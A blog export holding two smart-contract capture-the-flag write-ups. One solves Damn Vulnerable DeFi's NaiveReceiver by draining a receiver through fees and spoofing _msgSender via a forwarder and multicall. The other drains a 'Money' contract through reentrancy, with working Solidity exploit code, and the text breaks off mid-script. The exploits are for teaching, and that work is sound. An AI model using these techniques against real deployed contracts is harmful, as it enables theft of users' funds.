[{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" WriteUp for NaiveReceiver Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you\u0026rsquo;re new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges.\nKey Concepts to Learn In Solidity, low-level calls don\u0026rsquo;t strictly validate the calldata, which can lead to unintended behavior. For instance, if a function does not take any input parameters, you can still construct calldata that includes the function selector followed by extra data. When this function is called, it will execute successfully, and msg.data will contain the full calldata, including the extra appended data along with the function selector. This behavior can be leveraged in specific exploit scenarios, where functions process msg.data directly, potentially leading to unexpected results or vulnerabilities.\nCheck the below example.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Test{ 5 bytes public data; 6 function hello()public{ 7 data=msg.data; 8 } 9} 10 11 12contract Test1{ 13 Test test; 14 constructor(address _addr){ 15 test=Test(_addr); 16 } 17 function call_hello()public{ 18 bytes8 call_data=bytes8(keccak256(abi.encodePacked(\u0026#34;hello()\u0026#34;))); 19 bytes memory call_data1=abi.encodePacked(call_data); 20 (bool success,)=address(test).call(call_data1); 21 require(success,\u0026#34;Call Failed\u0026#34;); 22 } 23} I suggest you to try out this example in remix before going through the further solution.\nFirst, deploy the Test contract. Then, pass the address of the deployed Test contract as an argument to the constructor of the Test1 contract and deploy the Test1 contract.\nThen call the call_hello() function in the Test1 contract. Once the call is successful, check the value of data in the Test contract. Now directly call the hello() function in the Test contract and once the call is successful, check the value of data.\nYou can observe that the first time you check, the value of data is 0x19ff1d210e06a53e, and the second time you check, the value is 0x19ff1d21.\nThe difference is that the second time we are directly calling the hello() function from our EOA using Remix, whereas the first time we are calling hello() from another contract, and in that contract, we are constructing calldata to call the hello() function along with some other data.\nFrom this, we can conclude that when we send some data to a function more than the parameters it is expecting, the call won\u0026rsquo;t be reverted.\nThis understanding is crucial to solve this challenge. Once you understand this, I would suggest you go through the challenge once again and try to solve it before going to the Exploit part.\nIf you are a person who doesn\u0026rsquo;t know EIP712 or EIP3156, I would suggest you go through the EIPs and then try to solve the challenge.\nExploit The below are the source contracts.\nBasicForwader contract 1// SPDX-License-Identifier: MIT 2// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz) 3pragma solidity =0.8.25; 4 5import {EIP712} from \u0026#34;solady/utils/EIP712.sol\u0026#34;; 6import {ECDSA} from \u0026#34;@openzeppelin/contracts/utils/cryptography/ECDSA.sol\u0026#34;; 7import {Address} from \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; 8 9interface IHasTrustedForwarder { 10 function trustedForwarder() external view returns (address); 11} 12 13contract BasicForwarder is EIP712 { 14 struct Request { 15 address from; 16 address target; 17 uint256 value; 18 uint256 gas; 19 uint256 nonce; 20 bytes data; 21 uint256 deadline; 22 } 23 24 error InvalidSigner(); 25 error InvalidNonce(); 26 error OldRequest(); 27 error InvalidTarget(); 28 error InvalidValue(); 29 30 bytes32 private constant _REQUEST_TYPEHASH = keccak256( 31 \u0026#34;Request(address from,address target,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 deadline)\u0026#34; 32 ); 33 34 mapping(address =\u0026gt; uint256) public nonces; 35 36 /** 37 * @notice Check request and revert when not valid. A valid request must: 38 * - Include the expected value 39 * - Not be expired 40 * - Include the expected nonce 41 * - Target a contract that accepts this forwarder 42 * - Be signed by the original sender (`from` field) 43 */ 44 function _checkRequest(Request calldata request, bytes calldata signature) private view { 45 if (request.value != msg.value) revert InvalidValue(); 46 if (block.timestamp \u0026gt; request.deadline) revert OldRequest(); 47 if (nonces[request.from] != request.nonce) revert InvalidNonce(); 48 49 if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget(); 50 51 address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature); 52 if (signer != request.from) revert InvalidSigner(); 53 } 54 55 function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) { 56 _checkRequest(request, signature); 57 58 nonces[request.from]++; 59 60 uint256 gasLeft; 61 uint256 value = request.value; // in wei 62 address target = request.target; 63 bytes memory payload = abi.encodePacked(request.data, request.from); 64 uint256 forwardGas = request.gas; 65 assembly { 66 success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don\u0026#39;t copy returndata 67 gasLeft := gas() 68 } 69 70 if (gasLeft \u0026lt; request.gas / 63) { 71 assembly { 72 invalid() 73 } 74 } 75 } 76 77 function _domainNameAndVersion() internal pure override returns (string memory name, string memory version) { 78 name = \u0026#34;BasicForwarder\u0026#34;; 79 version = \u0026#34;1\u0026#34;; 80 } 81 82 function getDataHash(Request memory request) public pure returns (bytes32) { 83 return keccak256( 84 abi.encode( 85 _REQUEST_TYPEHASH, 86 request.from, 87 request.target, 88 request.value, 89 request.gas, 90 request.nonce, 91 keccak256(request.data), 92 request.deadline 93 ) 94 ); 95 } 96 97 function domainSeparator() external view returns (bytes32) { 98 return _domainSeparator(); 99 } 100 101 function getRequestTypehash() external pure returns (bytes32) { 102 return _REQUEST_TYPEHASH; 103 } 104} FlashLoanReceiver contract 1// SPDX-License-Identifier: MIT 2// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz) 3pragma solidity =0.8.25; 4 5import {IERC3156FlashBorrower} from \u0026#34;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\u0026#34;; 6import {WETH, NaiveReceiverPool} from \u0026#34;./NaiveReceiverPool.sol\u0026#34;; 7 8contract FlashLoanReceiver is IERC3156FlashBorrower { 9 address private pool; 10 11 constructor(address _pool) { 12 pool = _pool; 13 } 14 15 function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) 16 external 17 returns (bytes32) 18 { 19 assembly { 20 // gas savings 21 if iszero(eq(sload(pool.slot), caller())) { 22 mstore(0x00, 0x48f5c3ed) 23 revert(0x1c, 0x04) 24 } 25 } 26 27 if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency(); 28 29 uint256 amountToBeRepaid; 30 unchecked { 31 amountToBeRepaid = amount + fee; 32 } 33 34 _executeActionDuringFlashLoan(); 35 36 // Return funds to pool 37 WETH(payable(token)).approve(pool, amountToBeRepaid); 38 39 return keccak256(\u0026#34;ERC3156FlashBorrower.onFlashLoan\u0026#34;); 40 } 41 42 // Internal function where the funds received would be used 43 function _executeActionDuringFlashLoan() internal {} 44} Multicall contract 1// SPDX-License-Identifier: MIT 2// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz) 3pragma solidity =0.8.25; 4 5import {Address} from \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; 6import {Context} from \u0026#34;@openzeppelin/contracts/utils/Context.sol\u0026#34;; 7 8abstract contract Multicall is Context { 9 function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) { 10 results = new bytes[](data.length); 11 for (uint256 i = 0; i \u0026lt; data.length; i++) { 12 results[i] = Address.functionDelegateCall(address(this), data[i]); 13 } 14 return results; 15 } 16} NavieReceiverPool contract 1// SPDX-License-Identifier: MIT 2// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz) 3pragma solidity =0.8.25; 4 5import {IERC3156FlashLender} from \u0026#34;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol\u0026#34;; 6import {IERC3156FlashBorrower} from \u0026#34;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\u0026#34;; 7import {FlashLoanReceiver} from \u0026#34;./FlashLoanReceiver.sol\u0026#34;; 8import {Multicall} from \u0026#34;./Multicall.sol\u0026#34;; 9import {WETH} from \u0026#34;solmate/tokens/WETH.sol\u0026#34;; 10 11contract NaiveReceiverPool is Multicall, IERC3156FlashLender { 12 uint256 private constant FIXED_FEE = 1e18; // not the cheapest flash loan 13 bytes32 private constant CALLBACK_SUCCESS = keccak256(\u0026#34;ERC3156FlashBorrower.onFlashLoan\u0026#34;); 14 15 WETH public immutable weth; 16 address public immutable trustedForwarder; 17 address public immutable feeReceiver; 18 19 mapping(address =\u0026gt; uint256) public deposits; 20 uint256 public totalDeposits; 21 22 error RepayFailed(); 23 error UnsupportedCurrency(); 24 error CallbackFailed(); 25 26 constructor(address _trustedForwarder, address payable _weth, address _feeReceiver) payable { 27 weth = WETH(_weth); 28 trustedForwarder = _trustedForwarder; 29 feeReceiver = _feeReceiver; 30 _deposit(msg.value); 31 } 32 33 function maxFlashLoan(address token) external view returns (uint256) { 34 if (token == address(weth)) return weth.balanceOf(address(this)); 35 return 0; 36 } 37 38 function flashFee(address token, uint256) external view returns (uint256) { 39 if (token != address(weth)) revert UnsupportedCurrency(); 40 return FIXED_FEE; 41 } 42 43 function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) 44 external 45 returns (bool) 46 { 47 if (token != address(weth)) revert UnsupportedCurrency(); 48 49 // Transfer WETH and handle control to receiver 50 weth.transfer(address(receiver), amount); 51 totalDeposits -= amount; 52 53 if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) { 54 revert CallbackFailed(); 55 } 56 57 uint256 amountWithFee = amount + FIXED_FEE; 58 weth.transferFrom(address(receiver), address(this), amountWithFee); 59 totalDeposits += amountWithFee; 60 61 deposits[feeReceiver] += FIXED_FEE; 62 63 return true; 64 } 65 66 function withdraw(uint256 amount, address payable receiver) external { 67 // Reduce deposits 68 deposits[_msgSender()] -= amount; 69 totalDeposits -= amount; 70 71 // Transfer ETH to designated receiver 72 weth.transfer(receiver, amount); 73 } 74 75 function deposit() external payable { 76 _deposit(msg.value); 77 } 78 79 function _deposit(uint256 amount) private { 80 weth.deposit{value: amount}(); 81 82 deposits[_msgSender()] += amount; 83 totalDeposits += amount; 84 } 85 86 function _msgSender() internal view override returns (address) { 87 if (msg.sender == trustedForwarder \u0026amp;\u0026amp; msg.data.length \u0026gt;= 20) { 88 return address(bytes20(msg.data[msg.data.length - 20:])); 89 } else { 90 return super._msgSender(); 91 } 92 } 93} The below is the test contract where we write our exploit logic. 5. NavieReceiver contract\n1// SPDX-License-Identifier: MIT 2// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz) 3pragma solidity =0.8.25; 4 5import {Test, console} from \u0026#34;forge-std/Test.sol\u0026#34;; 6import {NaiveReceiverPool, Multicall, WETH} from \u0026#34;../../src/naive-receiver/NaiveReceiverPool.sol\u0026#34;; 7import {FlashLoanReceiver} from \u0026#34;../../src/naive-receiver/FlashLoanReceiver.sol\u0026#34;; 8import {BasicForwarder} from \u0026#34;../../src/naive-receiver/BasicForwarder.sol\u0026#34;; 9 10contract NaiveReceiverChallenge is Test { 11 address deployer = makeAddr(\u0026#34;deployer\u0026#34;); 12 address recovery = makeAddr(\u0026#34;recovery\u0026#34;); 13 address player; 14 uint256 playerPk; 15 16 uint256 constant WETH_IN_POOL = 1000e18; 17 uint256 constant WETH_IN_RECEIVER = 10e18; 18 19 NaiveReceiverPool pool; 20 WETH weth; 21 FlashLoanReceiver receiver; 22 BasicForwarder forwarder; 23 24 modifier checkSolvedByPlayer() { 25 vm.startPrank(player, player); 26 _; 27 vm.stopPrank(); 28 _isSolved(); 29 } 30 31 /** 32 * SETS UP CHALLENGE - DO NOT TOUCH 33 */ 34 function setUp() public { 35 (player, playerPk) = makeAddrAndKey(\u0026#34;player\u0026#34;); 36 startHoax(deployer); 37 38 // Deploy WETH 39 weth = new WETH(); 40 41 // Deploy forwarder 42 forwarder = new BasicForwarder(); 43 44 // Deploy pool and fund with ETH 45 pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer); 46 47 // Deploy flashloan receiver contract and fund it with some initial WETH 48 receiver = new FlashLoanReceiver(address(pool)); 49 weth.deposit{value: WETH_IN_RECEIVER}(); 50 weth.transfer(address(receiver), WETH_IN_RECEIVER); 51 52 vm.stopPrank(); 53 } 54 55 function test_assertInitialState() public { 56 // Check initial balances 57 assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL); 58 assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER); 59 60 // Check pool config 61 assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL); 62 assertEq(pool.flashFee(address(weth), 0), 1 ether); 63 assertEq(pool.feeReceiver(), deployer); 64 65 // Cannot call receiver 66 vm.expectRevert(0x48f5c3ed); 67 receiver.onFlashLoan( 68 deployer, 69 address(weth), // token 70 WETH_IN_RECEIVER, // amount 71 1 ether, // fee 72 bytes(\u0026#34;\u0026#34;) // data 73 ); 74 } 75 76 /** 77 * CODE YOUR SOLUTION HERE 78 */ 79 function test_naiveReceiver() public checkSolvedByPlayer { 80 /////////////////////////////////// 81 // Empty Receiver Balance////////// 82 /////////////////////////////////// 83 84 for (uint8 i = 0; i \u0026lt; 10; i++) { 85 pool.flashLoan(receiver, address(weth), WETH_IN_POOL, bytes(\u0026#34;\u0026#34;)); 86 } 87 88 /////////////////////////////////// 89 // Withdraw All Funds To Recovery// 90 /////////////////////////////////// 91 92 uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER; 93 bytes memory Withdrawdata = abi.encodeWithSignature(\u0026#34;withdraw(uint256,address)\u0026#34;, total, recovery, deployer); 94 bytes[] memory multicall_data_array = new bytes[](1); 95 multicall_data_array[0] = Withdrawdata; 96 bytes memory multicallEncodedData = abi.encodeWithSignature(\u0026#34;multicall(bytes[])\u0026#34;, multicall_data_array); 97 BasicForwarder.Request memory executeRequest = BasicForwarder.Request({ 98 from: player, 99 target: address(pool), 100 value: 0, 101 gas: 100000, 102 nonce: vm.getNonce(player), 103 data: multicallEncodedData, 104 deadline: block.timestamp + 1000 105 }); 106 107 bytes32 digest = 108 keccak256(abi.encodePacked(\u0026#34;\\x19\\x01\u0026#34;, forwarder.domainSeparator(), forwarder.getDataHash(executeRequest))); 109 110 (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest); 111 112 forwarder.execute(executeRequest, abi.encodePacked(r, s, v)); 113 } 114 115 /** 116 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH 117 */ 118 function _isSolved() private view { 119 // Player must have executed two or less transactions 120 assertLe(vm.getNonce(player), 2); 121 122 // The flashloan receiver contract has been emptied 123 assertEq(weth.balanceOf(address(receiver)), 0, \u0026#34;Unexpected balance in receiver contract\u0026#34;); 124 125 // Pool is empty too 126 assertEq(weth.balanceOf(address(pool)), 0, \u0026#34;Unexpected balance in pool\u0026#34;); 127 128 // All funds sent to recovery account 129 assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, \u0026#34;Not enough WETH in recovery account\u0026#34;); 130 } 131} In this challenge our task is to make _isSolved() function return true.\n1function _isSolved() private view { 2 // Player must have executed two or less transactions 3 assertLe(vm.getNonce(player), 2); 4 5 // The flashloan receiver contract has been emptied 6 assertEq(weth.balanceOf(address(receiver)), 0, \u0026#34;Unexpected balance in receiver contract\u0026#34;); 7 8 // Pool is empty too 9 assertEq(weth.balanceOf(address(pool)), 0, \u0026#34;Unexpected balance in pool\u0026#34;); 10 11 // All funds sent to recovery account 12 assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, \u0026#34;Not enough WETH in recovery account\u0026#34;); 13} The _isSolved() will be passed if we make the balance of WETH tokens in the receiver and pool zero and transfer all those tokens to the recovery address. You can look into setUp() function in test contract to understand how everything is deployed.\nNow, without any delay, let\u0026rsquo;s dive into the key functions which has the exploit.\n1function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) 2 external 3 returns (bool) 4 { 5 if (token != address(weth)) revert UnsupportedCurrency(); 6 7 // Transfer WETH and handle control to receiver 8 weth.transfer(address(receiver), amount); 9 totalDeposits -= amount; 10 11 if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) { 12 revert CallbackFailed(); 13 } 14 15 uint256 amountWithFee = amount + FIXED_FEE; 16 weth.transferFrom(address(receiver), address(this), amountWithFee); 17 totalDeposits += amountWithFee; 18 19 deposits[feeReceiver] += FIXED_FEE; 20 21 return true; 22} This function is from the NaiveReceiverPool contract. When someone calls the flashLoan() function, it will send the WETH tokens to the receiver passed and then call the onFlashLoan function. The receiver must pay back the WETH tokens within the same transaction along with the fee. If they fail to pay, the transaction will revert. While calling the onFlashLoan function, it will pass the address of msg.sender (loan initiator) as the first argument.\nSince the flashLoan() is calling onFlashLoan() on the receiver, the receiver must be a contract.\n1function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) 2 external 3 returns (bytes32) 4 { 5 assembly { 6 // gas savings 7 if iszero(eq(sload(pool.slot), caller())) { 8 mstore(0x00, 0x48f5c3ed) 9 revert(0x1c, 0x04) 10 } 11 } 12 13 if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency(); 14 15 uint256 amountToBeRepaid; 16 unchecked { 17 amountToBeRepaid = amount + fee; 18 } 19 20 _executeActionDuringFlashLoan(); 21 22 // Return funds to pool 23 WETH(payable(token)).approve(pool, amountToBeRepaid); 24 25 return keccak256(\u0026#34;ERC3156FlashBorrower.onFlashLoan\u0026#34;); 26} This function is from the NaiveReceiver contract. It will check if the pool has been set or not. If it is not set, it will revert; otherwise, it will continue executing. Then it will check whether the loan given is a WETH token or not. If it is not, it will revert; otherwise, it will continue execution. Then it will add the loan taken and the fee. Then it will call _executeActionDuringFlashLoan(). Once the call is completed, it will approve the pool contract to transfer WETH tokens and return the success message.\nIt is making all necessary checks, but it is not checking who actually executed the loan. So if we call the flashLoan() function in NaiveReceiverPool from our contract by passing the receiver as the receiver contract address, then it will initiate a loan to the receiver contract, and the receiver contract will use the loan amount and repay the loan amount along with the fee within the transaction.\nSince the fee is 1 WETH token for every loan, it will transfer 1 WETH token. So if we initiate a loan to the receiver contract 10 times, then the receiver contract balance will be zero.\nOur next goal is to make the pool balance as zero and transfer WETH from pool to recovery address.\n1function _msgSender() internal view override returns (address) { 2 if (msg.sender == trustedForwarder \u0026amp;\u0026amp; msg.data.length \u0026gt;= 20) { 3 return address(bytes20(msg.data[msg.data.length - 20:])); 4 } else { 5 return super._msgSender(); 6 } 7} The above function is from the NaiveReceiver contract. When it is called, it will check if the msg.sender (caller) is the BasicForwarder contract or not. If it is the BasicForwarder contract, it will return the last 20 bytes of calldata sent by the BasicForwarder contract. If the msg.sender is another address, then it will just return the address of the caller.\n1function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) { 2 _checkRequest(request, signature); 3 4 nonces[request.from]++; 5 6 uint256 gasLeft; 7 uint256 value = request.value; // in wei 8 address target = request.target; 9 bytes memory payload = abi.encodePacked(request.data, request.from); 10 uint256 forwardGas = request.gas; 11 assembly { 12 success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don\u0026#39;t copy returndata 13 gasLeft := gas() 14 } 15 16 if (gasLeft \u0026lt; request.gas / 63) { 17 assembly { 18 invalid() 19 } 20 } 21} The above function is from the BasicForwarder contract. It will check whether the signature passed to the function is signed by the from member of the struct. Once the _checkRequest() is passed, it will encode the data member and from member from the Request struct and assign it to payload. Then it will make a call to the target member of the Request struct passed. payload is calldata that is sent to the target. The last 20 bytes of payload will be the address of the from member of the Request struct.\nUsing the execute function, if we call any function in the NaiveReceiverPool contract other than multicall(), then _msgSender() in NaiveReceiverPool will return the address of the from member of the Request struct.\n1function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) { 2 results = new bytes[](data.length); 3 for (uint256 i = 0; i \u0026lt; data.length; i++) { 4 results[i] = Address.functionDelegateCall(address(this), data[i]); 5 } 6 return results; 7} But using the execute function, if we call the multicall() function in NaiveReceiverPool, then execute will add the from member of the Request struct to the data member of the Request struct and pass it to multicall(). Since our data only contains calldata to call multicall(), the multicall() function won\u0026rsquo;t care about the next 20 bytes appended by the execute() function to our actual data.\nThe multicall() function will take a bytes array as input and make a delegate call to NaiveReceiverPool by passing each element of the bytes array as data. Since we are calling multicall() using the execute() function in BasicForwarder, whatever data we need to pass to the multicall() function, we need to construct it before and send the data as the data member of the Request struct.\n1function withdraw(uint256 amount, address payable receiver) external { 2 // Reduce deposits 3 deposits[_msgSender()] -= amount; 4 totalDeposits -= amount; 5 6 // Transfer ETH to designated receiver 7 weth.transfer(receiver, amount); 8} So if we pass a bytes array containing calldata to the withdraw() function as an argument to multicall(), then it will check the necessary conditions and transfer WETH to the receiver from the address returned by _msgSender().\nWhen we call multicall(), it will make a delegate call. During a delegate call, the msg.sender and msg.value will be passed to the next call as the msg.sender who called the multicall() function and the msg.value sent during the multicall() function. However, msg.data will not be the same for both calls. For multicall(), the msg.data will be the data sent by execute(), and for withdraw(), the msg.data will be the data sent by the multicall() function.\nSo while constructing data for the withdraw() function, if we add an extra 20 bytes as the address of the deployer, then the withdraw() function will be called and it will call _msgSender(). _msgSender() will return the address of the deployer, and since the deployer is holding the entire WETH, the NaiveReceiverPool will transfer the WETH to whatever address we pass. Since our task is to transfer all WETH from NaiveReceiverPool to the recovery address, we need to pass the recovery address in the withdraw() function.\nThe below is the Exploit logic.\n1function test_naiveReceiver() public checkSolvedByPlayer { 2 /////////////////////////////////// 3 // Empty Receiver Balance////////// 4 /////////////////////////////////// 5 6 for (uint8 i = 0; i \u0026lt; 10; i++) { 7 pool.flashLoan(receiver, address(weth), WETH_IN_POOL, bytes(\u0026#34;\u0026#34;)); 8 } 9 10 /////////////////////////////////// 11 // Withdraw All Funds To Recovery// 12 /////////////////////////////////// 13 14 uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER; 15 bytes memory Withdrawdata = abi.encodeWithSignature(\u0026#34;withdraw(uint256,address)\u0026#34;, total, recovery, deployer); 16 bytes[] memory multicall_data_array = new bytes[](1); 17 multicall_data_array[0] = Withdrawdata; 18 bytes memory multicallEncodedData = abi.encodeWithSignature(\u0026#34;multicall(bytes[])\u0026#34;, multicall_data_array); 19 BasicForwarder.Request memory executeRequest = BasicForwarder.Request({ 20 from: player, 21 target: address(pool), 22 value: 0, 23 gas: 100000, 24 nonce: vm.getNonce(player), 25 data: multicallEncodedData, 26 deadline: block.timestamp + 1000 27 }); 28 29 bytes32 digest = 30 keccak256(abi.encodePacked(\u0026#34;\\x19\\x01\u0026#34;, forwarder.domainSeparator(), forwarder.getDataHash(executeRequest))); 31 32 (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest); 33 34 forwarder.execute(executeRequest, abi.encodePacked(r, s, v)); 35} That\u0026rsquo;s it for this challenge. Hope you enjoyed it. If you have any queries, leave a comment below.\n","date":"October 27, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/damn-vulnerable-defi/naivereceiver/","series":[{"title":"Damn-Vulnerable-Defi","url":"/series/damn-vulnerable-defi/"}],"smallImg":"","tags":[{"title":"Delegate Call","url":"/tags/delegate-call/"},{"title":"Access Control","url":"/tags/access-control/"}],"timestamp":1730033607,"title":"NaiveReceiver"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Unsolveable Money Captcha Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry. Challenge Description Oh no! Hackerika just made a super-duper mysterious block chain thingy! I\u0026rsquo;m not sure what she\u0026rsquo;s up to, maybe creating a super cool bank app? But guess what? It seems a bit wobbly because it\u0026rsquo;s asking us to solve a super tricky captcha! What a silly kid! Let\u0026rsquo;s help her learn how to make a super-duper awesome contract with no head-scratching captcha! XD\nExploit The below are the source contracts.\nSetup contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import \u0026#34;./Money.sol\u0026#34;; 5 6contract Setup { 7 Money public immutable moneyContract; 8 Captcha public immutable captchaContract; 9 constructor() payable { 10 require(msg.value == 100 ether); 11 captchaContract = new Captcha(); 12 moneyContract = new Money(captchaContract); 13 moneyContract.save{value: 10 ether}(); 14 } 15 function isSolved() public view returns (bool) { 16 return address(moneyContract).balance == 0; 17 } 18} Money contract 1// SPDX-License-Identifier: UNLICENSED 2pragma solidity ^0.8.0; 3 4import \u0026#34;./Captcha.sol\u0026#34;; 5 6contract Money { 7 mapping(address =\u0026gt; uint) public balances; 8 Captcha public captchaContract; 9 uint256 public immutable secret; 10 11 constructor(Captcha _captcha) { 12 captchaContract = _captcha; 13 secret = uint256(blockhash(block.prevrandao)); 14 } 15 16 function save() public payable { 17 require(msg.value \u0026gt; 0, \u0026#34;You don\u0026#39;t have money XP\u0026#34;); 18 balances[msg.sender] += msg.value; 19 } 20 21 function load(uint256 userProvidedCaptcha) public { 22 uint balance = balances[msg.sender]; 23 require(balance \u0026gt; 0, \u0026#34;You don\u0026#39;t have money to load XD\u0026#34;); 24 25 uint256 generatedCaptcha = captchaContract.generateCaptcha(secret); 26 require(userProvidedCaptcha == generatedCaptcha, \u0026#34;Invalid captcha\u0026#34;); 27 28 (bool success,) = msg.sender.call{value: balance}(\u0026#34;\u0026#34;); 29 require(success, \u0026#39;Oh my god, what is that!?\u0026#39;); 30 balances[msg.sender] = 0; 31 } 32} Captcha contract 1// SPDX-License-Identifier: UNLICENSED 2pragma solidity ^0.8.0; 3 4contract Captcha { 5 event CaptchaGenerated(uint256 captcha); 6 function generateCaptcha(uint256 _secret) external returns (uint256) { 7 uint256 captcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp))); 8 emit CaptchaGenerated(captcha); 9 return captcha; 10 } 11} In this challenge our task is make isSolved() function return true.\n1function isSolved() public view returns (bool) { 2 return address(moneyContract).balance == 0; 3} The isSolved() function returns true if the ETH balane of moneyContract is zero.\nNow let\u0026rsquo;s understand the Money contract.\nThe Money contract functions like a basic bank. people can save ETH in the contract and when they need it they can withdraw the ETH.\nPeople can save the ETH by calling the save() function.\n1function save() public payable { 2 require(msg.value \u0026gt; 0, \u0026#34;You don\u0026#39;t have money XP\u0026#34;); 3 balances[msg.sender] += msg.value; 4} When someone calls this function by sending some ETH, it will update the balance of msg.sender (caller) by the amount of ETH sent.\nThen later whenever the depositer want\u0026rsquo;s to withdraw their saved ETH they can call the load() function.\n1function load(uint256 userProvidedCaptcha) public { 2 uint balance = balances[msg.sender]; 3 require(balance \u0026gt; 0, \u0026#34;You don\u0026#39;t have money to load XD\u0026#34;); 4 5 uint256 generatedCaptcha = captchaContract.generateCaptcha(secret); 6 require(userProvidedCaptcha == generatedCaptcha, \u0026#34;Invalid captcha\u0026#34;); 7 8 (bool success,) = msg.sender.call{value: balance}(\u0026#34;\u0026#34;); 9 require(success, \u0026#39;Oh my god, what is that!?\u0026#39;); 10 balances[msg.sender] = 0; 11} The function load() takes an argument of type uint256 (userProvidedCaptcha). It fetches the ETH deposited by the msg.sender. If the deposited ETH is less than zero, the function call will revert. Otherwise, it generates a captcha by calling generateCaptcha() in the Captcha contract, passing secret as an argument. It then compares the generated value with the user-provided captcha. If both match, it transfers the deposited ETH back to the user. After the transfer, it checks if the transfer was successful. If successful, it updates the balance of msg.sender (caller) to zero.\nThe key point to observe here is that when the captcha matches, the function first sends the ETH and then updates the balance. This can lead to a reentrancy exploit. If the receiver is a smart contract, when load() transfers ETH, it will make a low-level call. If the contract has a receive() function, from within the receive() function, we can call the load() function again because our balance is still not updated.\nNow let\u0026rsquo;s look how captcha is generated.\n1function generateCaptcha(uint256 _secret) external returns (uint256) { 2 uint256 captcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp))); 3 emit CaptchaGenerated(captcha); 4 return captcha; 5} The function generateCaptcha() will take an argument of type uint256 (_secret) as input. It generates a captcha by hashing the combined text of _secret, block number, and block timestamp, and it will return the generated captcha.Since it is a external contract we can also directly call this function to generate captcha.\nDuring deployment, the Setup contract deposits 10 ether into the Money contract, giving the Money contract a balance of 10 ether. If we deposit 10 ether into the Money contract and then call the load() function, it will trigger the receive() function in our Exploit contract. In the receive function, if we include logic to call the load() function again, the remaining 10 ether in the contract will also be transferred to us. The balance will be updated only after the receive() function finishes calling load() repeatedly.\nSince the balance is updated to zero after every call, it doesn\u0026rsquo;t matter how many times we call load() as long as the contract\u0026rsquo;s balance is drained. If our logic in the receive() function calls the load() function repeatedly, even after the contract balance is drained, all the low-level calls will return false, and the load() function will revert with the message Oh my god, what is that!?.\nThe below is the exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Setup, Money, Captcha} from \u0026#34;src/contracts/Setup.sol\u0026#34;; 5 6contract ExploitMoney { 7 Setup public setup; 8 Money public money; 9 Captcha public captcha; 10 uint256 num = 0; 11 12 constructor() payable { 13 require(msg.value == 10 ether); 14 setup = Setup(address(this)); 15 money = Money(setup.moneyContract()); 16 captcha = Captcha(setup.captchaContract()); 17 } 18 19 function Exploit() public { 20 money.save{value: 10 ether}(); 21 uint256 secret = money.secret(); 22 uint256 gen_captcha = captcha.generateCaptcha(secret); 23 money.load(gen_captcha); 24 } 25 26 receive() external payable { 27 if (num == 0) { 28 num++; 29 uint256 secret = money.secret(); 30 uint256 gen_captcha = captcha.generateCaptcha(secret); 31 money.load(gen_captcha); 32 } 33 } 34} Below is the exploit script to deploy ExploitMoney and call the Exploit() function.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Script} from \u0026#34;forge-std/Script.sol\u0026#34;; 5import {ExploitMoney} from \u0026#34;./ExploitMoney.sol\u0026#34;; 6 7contract ExploitMoneyScript is Script { 8 function run() public { 9 vm.startBroadcast(); 10 ExploitMoney 